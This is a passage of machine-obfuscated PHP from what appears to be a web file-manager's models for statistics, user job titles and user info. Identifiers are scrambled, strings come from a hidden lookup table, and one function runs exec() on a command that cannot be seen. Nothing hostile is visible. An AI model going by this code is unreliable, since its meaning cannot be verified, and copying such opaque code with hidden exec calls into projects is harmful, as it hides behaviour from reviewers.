ModelBaseLight { public function init($—½§è) { $ÇßÈş¥ş =& $_SERVER[ñˆ‹ß¿÷]; $ÚÁ¼©¯ê = array($ÇßÈş¥ş[600] => array($ÇßÈş¥ş[33] => $ÇßÈş¥ş[1765], $ÇßÈş¥ş[273] => array($ÇßÈş¥ş[224], $ÇßÈş¥ş[772], $ÇßÈş¥ş[1766], $ÇßÈş¥ş[1767])), $ÇßÈş¥ş[1768] => array($ÇßÈş¥ş[33] => $ÇßÈş¥ş[1769], $ÇßÈş¥ş[273] => array($ÇßÈş¥ş[224], $ÇßÈş¥ş[770], $ÇßÈş¥ş[1770], $ÇßÈş¥ş[1771], $ÇßÈş¥ş[1772]))); if (!isset($ÚÁ¼©¯ê[$—½§è])) { return !1; } $this->optionType = $ÚÁ¼©¯ê[$—½§è][$ÇßÈş¥ş[33]]; $this->field = $ÚÁ¼©¯ê[$—½§è][$ÇßÈş¥ş[273]]; return !0; } public function listData($›æ‘–î = false, $ş¤—Í¡‹ = "\155\x6f\144\x69\146\x79\124\151\155\145", $›·¶‘¦“ = false) { return parent::listData($›æ‘–î, $ş¤—Í¡‹, $›·¶‘¦“); } public function trendList($Âë–å¥ß) { $ö¹‹é­ =& $_SERVER[ñˆ‹ß¿÷]; $Äæªïƒú = $this->listData(); if ($Äæªïƒú) { $§”Åº·Â = end($Äæªïƒú); $Çë†¤ı¼ = date($ö¹‹é­[1773], strtotime($ö¹‹é­[1774])); if ($§”Åº·Â[$ö¹‹é­[224]] == $Çë†¤ı¼) { return $Äæªïƒú; } $‚ƒõ•Õ = strtotime($§”Åº·Â[$ö¹‹é­[224]]); } if (!isset($‚ƒõ•Õ)) { $¥ç£ç‹‡ = $Âë–å¥ß == $ö¹‹é­[600] ? $ö¹‹é­[535] : $ö¹‹é­[832]; $‚ƒõ•Õ = Model($¥ç£ç‹‡)->min($ö¹‹é­[200]); } $Ñİ€·Ì– = $ö¹‹é­[1775] . ucfirst($Âë–å¥ß); $³‡ıÊ• = $this->dateList($‚ƒõ•Õ); foreach ($³‡ıÊ• as $Çë†¤ı¼) { $this->{$Ñİ€·Ì–}($Çë†¤ı¼); } return $this->listData(); } private function dateList($éùÆ²±‘) { $ßéÔÕø„ =& $_SERVER[ñˆ‹ß¿÷]; $ß­’³‘õ = $éùÆ²±‘; $İ³½Óäõ = strtotime($ßéÔÕø„[1774]); $İøÈõì¹ = array(); while ($ß­’³‘õ <= $İ³½Óäõ) { $İøÈõì¹[] = date($ßéÔÕø„[1773], $ß­’³‘õ); $ß­’³‘õ = strtotime($ßéÔÕø„[1776], $ß­’³‘õ); } return $İøÈõì¹; } public function _recordUser($£Öô—–± = '') { $Ù±ªöè¶ =& $_SERVER[ñˆ‹ß¿÷]; $Ãá»Ù–“ = strtotime(date($Ù±ªöè¶[1777], strtotime($£Öô—–±))); $ë¨Û•²¹ = strtotime(date($Ù±ªöè¶[1778], strtotime($£Öô—–±))); $šŸµÜ°³ = array($Ù±ªöè¶[200] => array($Ù±ªöè¶[1020], $ë¨Û•²¹)); $ôÑàı»… = Model($Ù±ªöè¶[535])->where($šŸµÜ°³)->count($Ù±ªöè¶[1664]); $šŸµÜ°³[$Ù±ªöè¶[200]] = array($Ù±ªöè¶[333], array($Ãá»Ù–“, $ë¨Û•²¹)); $°©îúµ¾ = Model($Ù±ªöè¶[535])->where($šŸµÜ°³)->count($Ù±ªöè¶[1664]); $šŸµÜ°³[$Ù±ªöè¶[33]] = $Ù±ªöè¶[1779]; $÷­ì”À = Model($Ù±ªöè¶[1780])->where($šŸµÜ°³)->count($Ù±ªöè¶[1781]); $Ùµ’ ‡Â = array($Ù±ªöè¶[224] => $£Öô—–±, $Ù±ªöè¶[772] => (int) $ôÑàı»…, $Ù±ªöè¶[1766] => (int) $°©îúµ¾, $Ù±ªöè¶[1767] => (int) $÷­ì”À); return $this->insert($Ùµ’ ‡Â); } public function _recordStore($Ä€ÉÁ«£ = '') { $öİƒ¨ßù =& $_SERVER[ñˆ‹ß¿÷]; $Ï¾“Âº = strtotime(date($öİƒ¨ßù[1778], strtotime($Ä€ÉÁ«£))); $Ú”Ï‚•³ = array($öİƒ¨ßù[200] => array($öİƒ¨ßù[1020], $Ï¾“Âº)); $»¥‹æŞº = Model($öİƒ¨ßù[471])->where($Ú”Ï‚•³)->sum($öİƒ¨ßù[76]); $Ú”Ï‚•³[$öİƒ¨ßù[410]] = 0; $¥ïüºœµ = Model($öİƒ¨ßù[832])->where($Ú”Ï‚•³)->sum($öİƒ¨ßù[76]); $Ú”Ï‚•³[$öİƒ¨ßù[411]] = 1; $ØÎÖôÏ¼ = Model($öİƒ¨ßù[832])->where($Ú”Ï‚•³)->sum($öİƒ¨ßù[76]); $Ú”Ï‚•³[$öİƒ¨ßù[411]] = 2; $É·™½œØ = Model($öİƒ¨ßù[832])->where($Ú”Ï‚•³)->sum($öİƒ¨ßù[76]); $ úÜşÕ = array($öİƒ¨ßù[224] => $Ä€ÉÁ«£, $öİƒ¨ßù[770] => (int) $¥ïüºœµ, $öİƒ¨ßù[1770] => (int) $»¥‹æŞº, $öİƒ¨ßù[1771] => (int) $ØÎÖôÏ¼, $öİƒ¨ßù[1772] => (int) $É·™½œØ); return $this->insert($ úÜşÕ); } public function trend($ßæª‚¦, $‹Áğ½©´) { $Â«Ãáşë =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->init($ßæª‚¦)) { return !1; } $õí‡ íÎ = $this->trendList($ßæª‚¦); if ($õí‡ íÎ && $‹Áğ½©´ != $Â«Ãáşë[1637]) { $ŠÔöá•î = $õí‡ íÎ[0][$Â«Ãáşë[224]]; $÷•ï¹Í× = $this->validDate($‹Áğ½©´, $ŠÔöá•î); $°êÏ°„Ş = array(); $®—¸éÒ = array_to_keyvalue($õí‡ íÎ, $Â«Ãáşë[224]); foreach ($÷•ï¹Í× as $å‹ÓÙÒì) { if (isset($®—¸éÒ[$å‹ÓÙÒì])) { $¶ÅÉÁËÒ = $®—¸éÒ[$å‹ÓÙÒì]; } else { $¶ÅÉÁËÒ = end($õí‡ íÎ); $¶ÅÉÁËÒ[$Â«Ãáşë[224]] = $å‹ÓÙÒì; if ($ßæª‚¦ == $Â«Ãáşë[600]) { $¶ÅÉÁËÒ[$Â«Ãáşë[1766]] = $¶ÅÉÁËÒ[$Â«Ãáşë[1767]] = 0; } } $°êÏ°„Ş[] = $¶ÅÉÁËÒ; } $õí‡ íÎ = $°êÏ°„Ş; } $”÷Àüˆ = array($Â«Ãáşë[600] => array($Â«Ãáşë[772] => LNG($Â«Ãáşë[1782]), $Â«Ãáşë[1766] => LNG($Â«Ãáşë[1783]), $Â«Ãáşë[1767] => LNG($Â«Ãáşë[1784])), $Â«Ãáşë[1768] => array($Â«Ãáşë[770] => LNG($Â«Ãáşë[1785]), $Â«Ãáşë[1770] => LNG($Â«Ãáşë[1786]), $Â«Ãáşë[1771] => LNG($Â«Ãáşë[1787]), $Â«Ãáşë[1772] => LNG($Â«Ãáşë[1788]))); $ú¶Ó± = array($Â«Ãáşë[600] => $Â«Ãáşë[1789], $Â«Ãáşë[1768] => $Â«Ãáşë[76]); if (empty($õí‡ íÎ)) { $å‹ÓÙÒì = date($Â«Ãáşë[1773], strtotime($Â«Ãáşë[1774])); $ùåòµŸ’ = array($Â«Ãáşë[224] => $å‹ÓÙÒì); foreach ($”÷Àüˆ[$ßæª‚¦] as $È¼®üŠ  => $¾ ‡Ş‚Ğ) { $ùåòµŸ’[$È¼®üŠ ] = 0; } $õí‡ íÎ[] = $ùåòµŸ’; } $‘ãå„¤¤ = array(); foreach ($õí‡ íÎ as $¾ ‡Ş‚Ğ) { if ($ßæª‚¦ == $Â«Ãáşë[1768] && $¾ ‡Ş‚Ğ[$Â«Ãáşë[1770]] > $¾ ‡Ş‚Ğ[$Â«Ãáşë[770]]) { $¾ ‡Ş‚Ğ[$Â«Ãáşë[1770]] = $¾ ‡Ş‚Ğ[$Â«Ãáşë[770]]; } foreach ($”÷Àüˆ[$ßæª‚¦] as $È¼®üŠ  => $şº…Ù³Ò) { $¶ÅÉÁËÒ = array($Â«Ãáşë[224] => $¾ ‡Ş‚Ğ[$Â«Ãáşë[224]], $Â«Ãáşë[1563] => $şº…Ù³Ò); $¶ÅÉÁËÒ[$ú¶Ó±[$ßæª‚¦]] = isset($¾ ‡Ş‚Ğ[$È¼®üŠ ]) ? $¾ ‡Ş‚Ğ[$È¼®üŠ ] : 0; $‘ãå„¤¤[] = $¶ÅÉÁËÒ; } } return $‘ãå„¤¤; } public function validDate($û€İ‚, $•·ë÷˜ı) { $©®ığ =& $_SERVER[ñˆ‹ß¿÷]; $€×®ïõè = date($©®ığ[1773], strtotime($©®ığ[1774])); $ßÇ ”ıï = array($€×®ïõè); switch ($û€İ‚) { case $©®ığ[1644]: $ÖİÙ¹í€ = mktime(0, 0, 0, date($©®ığ[1790]), date($©®ığ[1384]) - date($©®ığ[1447]) + 7 - 7, date($©®ığ[1791])); $›®äÌËÀ = 0; do { $¾ÁÜØ‡• = date($©®ığ[1773], $ÖİÙ¹í€ - 3600 * 24 * 7 * $›®äÌËÀ); $ßÇ ”ıï[] = $¾ÁÜØ‡•; $›®äÌËÀ++; } while ($•·ë÷˜ı < $¾ÁÜØ‡•); break; case $©®ığ[1642]: $›®äÌËÀ = 1; do { $İÔÒşûš = date($©®ığ[1792], strtotime("\55\x20{$›®äÌËÀ}\x20\x6d\x6f\156\x74\150\x73")); $ßÇ ”ıï[] = $İÔÒşûš; $›®äÌËÀ++; } while ($•·ë÷˜ı < $İÔÒşûš); break; case $©®ığ[1793]: $òÀ°€æ = (int) date($©®ığ[1791], strtotime($•·ë÷˜ı)); $ìôÎ…Ï = (int) date($©®ığ[1791]); if ($òÀ°€æ >= $ìôÎ…Ï) { break; } for ($òÀ°€æ; $òÀ°€æ < $ìôÎ…Ï; $òÀ°€æ++) { $ßÇ ”ıï[] = $òÀ°€æ . $©®ığ[1794]; } break; default: break; } if ($•·ë÷˜ı > end($ßÇ ”ıï)) { array_pop($ßÇ ”ıï); } sort($ßÇ ”ıï); return $ßÇ ”ıï; } public function listTable($à£ÚŸ²Ì) { $Âóò¸° = ucfirst($à£ÚŸ²Ì); return Model($Âóò¸°)->listData(); } public function option($­îøÊ‰˜) { $ííõ¸÷‹ = $_SERVER[ñˆ‹ß¿÷][1795] . ucfirst($­îøÊ‰˜); return $this->{$ííõ¸÷‹}(); } private function optionUser() { $ÀÒÃ¿Ë® =& $_SERVER[ñˆ‹ß¿÷]; $Ûê·ğŞ§ = Model($ÀÒÃ¿Ë®[535])->count($ÀÒÃ¿Ë®[1664]); $§‡‰×•‹ = Model($ÀÒÃ¿Ë®[535])->where($ÀÒÃ¿Ë®[1796])->count($ÀÒÃ¿Ë®[1664]); $’ÚÉƒöù = intval($GLOBALS[$ÀÒÃ¿Ë®[6]][$ÀÒÃ¿Ë®[349]][$ÀÒÃ¿Ë®[1619]]) / 3600; $¢Ã—À­¸ = strtotime("\x2d{$’ÚÉƒöù}\x20\x68\157\x75\x72\x73"); $­á¯¦Äî = strtotime(date($ÀÒÃ¿Ë®[1777])); if ($¢Ã—À­¸ < $­á¯¦Äî) { $¢Ã—À­¸ = $­á¯¦Äî; } $¹í§‚¤¡ = array($ÀÒÃ¿Ë®[1797] => array($ÀÒÃ¿Ë®[1021], $¢Ã—À­¸)); $¡åà³Ã = (int) Model($ÀÒÃ¿Ë®[535])->where($¹í§‚¤¡)->count($ÀÒÃ¿Ë®[1664]); if (!$¡åà³Ã) { $¡åà³Ã = 1; } $¹í§‚¤¡ = array($ÀÒÃ¿Ë®[1797] => array($ÀÒÃ¿Ë®[1021], $­á¯¦Äî)); $Òï ôó™ = Model($ÀÒÃ¿Ë®[535])->where($¹í§‚¤¡)->count($ÀÒÃ¿Ë®[1664]); return array($ÀÒÃ¿Ë®[766] => (int) $Ûê·ğŞ§, $ÀÒÃ¿Ë®[1798] => (int) ($Ûê·ğŞ§ - $§‡‰×•‹), $ÀÒÃ¿Ë®[1799] => (int) $§‡‰×•‹, $ÀÒÃ¿Ë®[1800] => (int) $Òï ôó™, $ÀÒÃ¿Ë®[1801] => $¡åà³Ã); } private function optionFile() { $ƒ”Òğê¥ =& $_SERVER[ñˆ‹ß¿÷]; $‹êã†²Ï = $this->sourceSize(); $éŒ½Ñ— = $‹êã†²Ï[$ƒ”Òğê¥[76]]; $ìœ˜¾Œ = $‹êã†²Ï[$ƒ”Òğê¥[1770]]; $¨ò—ØÃí = Model($ƒ”Òğê¥[832])->where(array($ƒ”Òğê¥[410] => 0))->count($ƒ”Òğê¥[402]); $Î’èê = array($ƒ”Òğê¥[410] => 0, $ƒ”Òğê¥[200] => array($ƒ”Òğê¥[1021], strtotime(date($ƒ”Òğê¥[1777])))); $Ç¨›áô‘ = Model($ƒ”Òğê¥[832])->where($Î’èê)->sum($ƒ”Òğê¥[76]); $‰ü¿ÍªÁ = Model($ƒ”Òğê¥[832])->where($Î’èê)->count($ƒ”Òğê¥[402]); return array($ƒ”Òğê¥[770] => $éŒ½Ñ—, $ƒ”Òğê¥[1770] => $ìœ˜¾Œ, $ƒ”Òğê¥[1802] => $éŒ½Ñ— - $ìœ˜¾Œ, $ƒ”Òğê¥[1803] => (int) $Ç¨›áô‘, $ƒ”Òğê¥[772] => (int) $¨ò—ØÃí, $ƒ”Òğê¥[1804] => (int) $‰ü¿ÍªÁ); } private function optionAccess() { $éÄÚ§ªİ =& $_SERVER[ñˆ‹ß¿÷]; return array($éÄÚ§ªİ[766] => $this->typeLogCnt(), $éÄÚ§ªİ[107] => $this->typeLogCnt($éÄÚ§ªİ[107]), $éÄÚ§ªİ[452] => $this->typeLogCnt($éÄÚ§ªİ[452]), $éÄÚ§ªİ[1805] => $this->typeLogCnt($éÄÚ§ªİ[1805]), $éÄÚ§ªİ[1806] => $this->typeLogCnt($éÄÚ§ªİ[1806]), $éÄÚ§ªİ[600] => $this->typeLogCnt($éÄÚ§ªİ[12], $éÄÚ§ªİ[1781])); } private function typeLogCnt($—µ®â… = '', $ß§ÎÌ´Á = "\x69\144") { $×”¯«Å× =& $_SERVER[ñˆ‹ß¿÷]; $ã®¨­­¸ = array($×”¯«Å×[107] => array($×”¯«Å×[1807], $×”¯«Å×[1808]), $×”¯«Å×[452] => array($×”¯«Å×[1809], $×”¯«Å×[1810]), $×”¯«Å×[1805] => array($×”¯«Å×[1811], $×”¯«Å×[1812], $×”¯«Å×[1813]), $×”¯«Å×[1806] => array($×”¯«Å×[1814], $×”¯«Å×[1815]), $×”¯«Å×[1816] => array($×”¯«Å×[1817], $×”¯«Å×[1818], $×”¯«Å×[1819])); $·ÅØÏÄÔ = strtotime(date($×”¯«Å×[1777])); $š­»ÕœŸ = array($×”¯«Å×[200] => array($×”¯«Å×[1021], $·ÅØÏÄÔ)); if ($—µ®â…) { $š­»ÕœŸ[$×”¯«Å×[33]] = array($×”¯«Å×[7], $ã®¨­­¸[$—µ®â…]); } $¹õÔî¢ = Model($×”¯«Å×[1780])->where($š­»ÕœŸ)->count($ß§ÎÌ´Á); return (int) $¹õÔî¢; } private function optionServer() { $éÏÚ¸ş€ =& $_SERVER[ñˆ‹ß¿÷]; $“Ô¨ ·ö = $this->diskDriver(); $ç‡Í€ş = KodIO::defaultDriver(); $ ¬å«Øñ = array($éÏÚ¸ş€[824] => $ç‡Í€ş[$éÏÚ¸ş€[399]]); $Ì›£Ğ“ = Model($éÏÚ¸ş€[471])->where($ ¬å«Øñ)->sum($éÏÚ¸ş€[76]); $Ï…ö˜á = explode($éÏÚ¸ş€[53], $_SERVER[$éÏÚ¸ş€[143]]); $ÇëÚà£ = $Ï…ö˜á[0]; $ÒÅóÁ½â = $GLOBALS[$éÏÚ¸ş€[6]][$éÏÚ¸ş€[21]]; $ûÃ Ñãù = $ÒÅóÁ½â[$éÏÚ¸ş€[983]]; if ($ûÃ Ñãù == $éÏÚ¸ş€[971]) { $‰¢Ş¹—ı = explode($éÏÚ¸ş€[1279], $ÒÅóÁ½â[$éÏÚ¸ş€[982]]); $ûÃ Ñãù = $‰¢Ş¹—ı[0]; } if ($ûÃ Ñãù == $éÏÚ¸ş€[919] || $ûÃ Ñãù == $éÏÚ¸ş€[811]) { $ê‡Ù¿»Ú = Model()->db()->query($éÏÚ¸ş€[1820]); $§—¬ÉùŒ = $ê‡Ù¿»Ú[0] && isset($ê‡Ù¿»Ú[0][$éÏÚ¸ş€[1562]]) ? $ê‡Ù¿»Ú[0][$éÏÚ¸ş€[1562]] : 0; $ûÃ Ñãù = $éÏÚ¸ş€[1821] . ($§—¬ÉùŒ ? $éÏÚ¸ş€[8] . $§—¬ÉùŒ : $éÏÚ¸ş€[12]); } $ïò“¤ÉŠ = $GLOBALS[$éÏÚ¸ş€[6]][$éÏÚ¸ş€[349]][$éÏÚ¸ş€[834]]; return array($éÏÚ¸ş€[1822] => $“Ô¨ ·ö ? $“Ô¨ ·ö[$éÏÚ¸ş€[1823]] : 0, $éÏÚ¸ş€[1824] => $“Ô¨ ·ö ? $“Ô¨ ·ö[$éÏÚ¸ş€[1825]] : 0, $éÏÚ¸ş€[1826] => (int) $ç‡Í€ş[$éÏÚ¸ş€[1823]] * 1024 * 1024 * 1024, $éÏÚ¸ş€[1827] => (int) $Ì›£Ğ“, $éÏÚ¸ş€[1828] => ucfirst($ÇëÚà£), $éÏÚ¸ş€[1829] => $éÏÚ¸ş€[1830] . PHP_VERSION, $éÏÚ¸ş€[1831] => phpBuild64() ? 64 : 32, $éÏÚ¸ş€[765] => str_replace($éÏÚ¸ş€[1137], $éÏÚ¸ş€[999], $ûÃ Ñãù), $éÏÚ¸ş€[349] => ucfirst($ïò“¤ÉŠ), $éÏÚ¸ş€[32] => $_SERVER[$éÏÚ¸ş€[1832]]); } private function diskDriver() { $£á‚‹½Â =& $_SERVER[ñˆ‹ß¿÷]; $³ÊèÚ• = $£á‚‹½Â[8]; $†·æƒ”” = $GLOBALS[$£á‚‹½Â[6]][$£á‚‹½Â[1295]] == $£á‚‹½Â[1296]; if ($†·æƒ””) { $³ÊèÚ• = $£á‚‹½Â[1833]; if (function_exists($£á‚‹½Â[1834])) { exec($£á‚‹½Â[1835], $ìÄ¡€Ä); $³ÊèÚ• = $ìÄ¡€Ä[1] . $£á‚‹½Â[8]; } } if (!file_exists($³ÊèÚ•)) { return; } $ÍáëëÇğ = @disk_total_space($³ÊèÚ•); $©õæ‡º = $ÍáëëÇğ - @disk_free_space($³ÊèÚ•); return array($£á‚‹½Â[1823] => $ÍáëëÇğ, $£á‚‹½Â[1825] => $©õæ‡º); } public function fileChart($ÅÖ æó†) { $×Ü¿œ˜Â =& $_SERVER[ñˆ‹ß¿÷]; if (isset($ÅÖ æó†[$×Ü¿œ˜Â[1664]])) { return Model($×Ü¿œ˜Â[832])->userFileTypeProfile($ÅÖ æó†[$×Ü¿œ˜Â[1664]]); } if (isset($ÅÖ æó†[$×Ü¿œ˜Â[1836]])) { return Model($×Ü¿œ˜Â[832])->groupFileTypeProfile($ÅÖ æó†[$×Ü¿œ˜Â[1836]]); } $•§¸Ğ¦â = $this->sourceSize(); $¢×úªÖĞ = array($×Ü¿œ˜Â[432] => 0, $×Ü¿œ˜Â[411] => 1); $¦Ë¯–£æ = Model($×Ü¿œ˜Â[832])->where($¢×úªÖĞ)->sum($×Ü¿œ˜Â[76]); $¢×úªÖĞ[$×Ü¿œ˜Â[411]] = 2; $Ú¯ÛÉ‹Î = Model($×Ü¿œ˜Â[832])->where($¢×úªÖĞ)->sum($×Ü¿œ˜Â[76]); return array($×Ü¿œ˜Â[770] => $•§¸Ğ¦â[$×Ü¿œ˜Â[76]], $×Ü¿œ˜Â[1770] => $•§¸Ğ¦â[$×Ü¿œ˜Â[1770]], $×Ü¿œ˜Â[1771] => (int) $¦Ë¯–£æ, $×Ü¿œ˜Â[1772] => (int) $Ú¯ÛÉ‹Î); } private function sourceSize() { $º°³Áí =& $_SERVER[ñˆ‹ß¿÷]; $Ë—¨ôúŠ = Model($º°³Áí[832])->where(array($º°³Áí[410] => 0))->sum($º°³Áí[76]); $ÈÃŒ’óó = Model($º°³Áí[471])->sum($º°³Áí[76]); if ($ÈÃŒ’óó > $Ë—¨ôúŠ) { $ÈÃŒ’óó = $Ë—¨ôúŠ; } return array($º°³Áí[76] => (int) $Ë—¨ôúŠ, $º°³Áí[1770] => (int) $ÈÃŒ’óó); } } goto fÁÈ„ÆÀ±¨; bî‚ê¡ÎÕé: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x6a\157\x62\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\x64\x65\163\143", "\163\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\x4a\157\142\114\151\163\164"; public function listData($ˆªø—¹ = false, $Îö…Æ”˜ = "\163\x6f\x72\x74", $”Ç¦´ïê = false) { return parent::listData($ˆªø—¹, $Îö…Æ”˜, $”Ç¦´ïê); } public function remove($Ş¡¦äô–) { return parent::remove($Ş¡¦äô–); } public function add($íôöŠ±Ş) { $Ä‡äèÑ¹ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->findByName($íôöŠ±Ş[$Ä‡äèÑ¹[32]])) { return !1; } $íôöŠ±Ş[$Ä‡äèÑ¹[1860]] = $this->getSort(); return parent::insert($íôöŠ±Ş); } private function getSort() { $ÃÒÕæÏğ =& $_SERVER[ñˆ‹ß¿÷]; $öšÂÇØ… = parent::listData(); $«ï²´·Ê = array_to_keyvalue($öšÂÇØ…, $ÃÒÕæÏğ[12], $ÃÒÕæÏğ[1860]); return empty($«ï²´·Ê) ? 0 : max($«ï²´·Ê) + 1; } public function update($Ü„·Á¬, $•éá·«) { $İÂ¦×±ç =& $_SERVER[ñˆ‹ß¿÷]; $¶êªş‘÷ = parent::listData($Ü„·Á¬); $ìÜƒÍß = $this->findByName($•éá·«[$İÂ¦×±ç[32]]); if (!$¶êªş‘÷ || $ìÜƒÍß && $ìÜƒÍß[$İÂ¦×±ç[399]] != $¶êªş‘÷[$İÂ¦×±ç[399]]) { return !1; } return parent::update($Ü„·Á¬, $•éá·«); } public function setUserJob($şŸµïÅ, $ºã¥Û„à) { $ŞöÆ‚ã— =& $_SERVER[ñˆ‹ß¿÷]; if (!is_array($ºã¥Û„à)) { $ºã¥Û„à = array($ºã¥Û„à); } $›ÕÄçä = parent::listData(); $¹å²«åÛ = array_to_keyvalue($›ÕÄçä, $ŞöÆ‚ã—[32]); $ôÈçØñŒ = $ŞöÆ‚ã—[378]; foreach ($ºã¥Û„à as $•å“¤¦ª) { if ($¹å²«åÛ[$•å“¤¦ª]) { $ôÈçØñŒ .= $¹å²«åÛ[$•å“¤¦ª][$ŞöÆ‚ã—[399]] . $ŞöÆ‚ã—[50]; } else { $«©ì¹˜¡ = $this->add($•å“¤¦ª); $ôÈçØñŒ .= $«©ì¹˜¡ . $ŞöÆ‚ã—[50]; } } $ôÈçØñŒ = rtrim($ôÈçØñŒ, $ŞöÆ‚ã—[50]); Model($ŞöÆ‚ã—[535])->metaSet($şŸµïÅ, self::JOB_KEY, $ôÈçØñŒ); } public function getUserJob($ƒÄ¤‰‹) { $·´Õë¹— = Model($_SERVER[ñˆ‹ß¿÷][535])->metaGet($ƒÄ¤‰‹); return $this->getUserJobInfo($·´Õë¹—[self::JOB_KEY]); } public function getUserJobInfo($Â¾Õ×™’) { $ëô™†ä =& $_SERVER[ñˆ‹ß¿÷]; $”‘’Üôˆ = explode($ëô™†ä[50], $Â¾Õ×™’); $â™ÊûÂ— = parent::listData(); $â™ÊûÂ— = array_remove_key($â™ÊûÂ—, $ëô™†ä[200]); $÷Œ¡¥² = array(); foreach ($”‘’Üôˆ as $û‰©ÜŞˆ) { if (isset($â™ÊûÂ—[$û‰©ÜŞˆ])) { $÷Œ¡¥²[] = $â™ÊûÂ—[$û‰©ÜŞˆ]; } } return $÷Œ¡¥²; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\145" => "\x75\x73\x65\x72\x5f\x6d\x65\x74\x61", "\x6d\x65\x74\x61\x46\x69\145\x6c\x64" => "\165\x73\x65\162\111\104"); protected $simpleField = "\x75\x73\x65\162\x49\x44\x2c\x6e\151\143\x6b\116\x61\155\145\x2c\156\x61\155\145\x2c\x61\166\x61\164\x61\x72\54\163\x65\170\54\x73\164\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($à™éÈ®) { $•€òªÛÎ =& $_SERVER[ñˆ‹ß¿÷]; $³ÀóçÖ€ = $•€òªÛÎ[2280]; return array($•€òªÛÎ[1914] => array($à™éÈ®[0], $³ÀóçÖ€), $•€òªÛÎ[1916] => array($à™éÈ®[0], $³ÀóçÖ€), $•€òªÛÎ[2281] => array($à™éÈ®[0], $³ÀóçÖ€)); } protected function getInfo($ô€·µçÎ, $í‹Óªèß = false) { $éºÀÄ‰Œ = $this->getInfoSimple($ô€·µçÎ); if (!is_array($éºÀÄ‰Œ)) { return array(); } if ($í‹Óªèß) { return $this->_getInfoApply($éºÀÄ‰Œ); } return $this->cacheFunctionGet($_SERVER[ñˆ‹ß¿÷][1918], $ô€·µçÎ); } protected function getInfoFull($Ûİ áî‰, $õƒÔ¥›è = false) { $À¬ ­• = $this->getInfoSimple($Ûİ áî‰); if (!is_array($À¬ ­•)) { return array(); } if ($õƒÔ¥›è) { return $this->_getInfoApply($À¬ ­•, !0); } return $this->cacheFunctionGet($_SERVER[ñˆ‹ß¿÷][2282], $Ûİ áî‰); } private function _getInfoApply($‹ş¸ôÑ, $ÊãáÔ¥ = false) { $úàÊôÃƒ =& $_SERVER[ñˆ‹ß¿÷]; if (!$‹ş¸ôÑ) { return $‹ş¸ôÑ; } $öƒ¡áô = md5($úàÊôÃƒ[2283] . $‹ş¸ôÑ[$úàÊôÃƒ[896]] . $úàÊôÃƒ[2284] . $‹ş¸ôÑ[$úàÊôÃƒ[32]]); $‹ş¸ôÑ = $this->_listDataApplyItem($‹ş¸ôÑ); $Ò‘¸ª© = Model($úàÊôÃƒ[1334])->metaGet($‹ş¸ôÑ[$úàÊôÃƒ[86]][$úàÊôÃƒ[402]]); $‹ş¸ôÑ[$úàÊôÃƒ[2285]] = $öƒ¡áô; $‹ş¸ôÑ[$úàÊôÃƒ[86]][$úàÊôÃƒ[2105]] = isset($Ò‘¸ª©[$úàÊôÃƒ[2106]]) ? $Ò‘¸ª©[$úàÊôÃƒ[2106]] : null; if ($ÊãáÔ¥) { $‹ş¸ôÑ[$úàÊôÃƒ[466]] = $this->metaGet($‹ş¸ôÑ[$úàÊôÃƒ[1664]]); } return $‹ş¸ôÑ; } protected function getInfoSimple($×ï«¸Ë‹, $ó«úÑ¡¶ = false) { $¾°Ÿ€‚Ã =& $_SERVER[ñˆ‹ß¿÷]; if (!$×ï«¸Ë‹) { return array(); } if ($ó«úÑ¡¶) { $ø×ÜŠß† = $this->where(array($¾°Ÿ€‚Ã[1664] => intval($×ï«¸Ë‹)))->find(); if (!is_array($ø×ÜŠß†)) { return array(); } $ø×ÜŠß†[$¾°Ÿ€‚Ã[543]] = Action($¾°Ÿ€‚Ã[2286])->parseUrl($ø×ÜŠß†[$¾°Ÿ€‚Ã[543]]); return $ø×ÜŠß†; } return $this->cacheFunctionGet($¾°Ÿ€‚Ã[1919], $×ï«¸Ë‹); } protected function getInfoSimpleOuter($¬„š®–¯) { $÷ëã¼„ğ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¬„š®–¯ || $¬„š®–¯ == 0) { return array($÷ëã¼„ğ[1664] => $÷ëã¼„ğ[197], $÷ëã¼„ğ[32] => $÷ëã¼„ğ[162] . LNG($÷ëã¼„ğ[2287]) . $÷ëã¼„ğ[164], $÷ëã¼„ğ[543] => STATIC_PATH . $÷ëã¼„ğ[2288]); } $¾ƒ¤³‡¯ = $this->cacheFunctionGet($÷ëã¼„ğ[1919], $¬„š®–¯); $¤É³°º• = array_field_key($¾ƒ¤³‡¯, explode($÷ëã¼„ğ[50], $this->simpleField)); if (!$¤É³°º•) { return array($÷ëã¼„ğ[1664] => $÷ëã¼„ğ[1197], $÷ëã¼„ğ[32] => $÷ëã¼„ğ[162] . LNG($÷ëã¼„ğ[2289]) . $÷ëã¼„ğ[164], $÷ëã¼„ğ[543] => STATIC_PATH . $÷ëã¼„ğ[2290]); } $¤É³°º•[$÷ëã¼„ğ[543]] = Action($÷ëã¼„ğ[2286])->parseUrl($¤É³°º•[$÷ëã¼„ğ[543]]); return $¤É³°º•; } protected function groupUser($‹ïáÛÃ‘) { } public static function errorLang($ÌË¸€¾´) { $üÌôßÑß =& $_SERVER[ñˆ‹ß¿÷]; $ıµ´Ğôº = array(self::ERROR_USER_NOT_EXISTS => $üÌôßÑß[2291], self::ERROR_USER_PASSWORD_ERROR => $üÌôßÑß[2292], self::ERROR_USER_EXIST_NAME => $üÌôßÑß[2293], self::ERROR_USER_EXIST_PHONE => $üÌôßÑß[2294], self::ERROR_USER_EXIST_EMAIL => $üÌôßÑß[2295], self::ERROR_USER_LOGIN_LOCK => $üÌôßÑß[2296], self::ERROR_IP_NOT_ALLOW => $üÌôßÑß[2297], self::ERROR_USER_EXIST_NICKNAME => $üÌôßÑß[2298]); return LNG($ıµ´Ğôº[$ÌË¸€¾´]); } public function getInfoByMeta($ÔŒÍÄ®£, 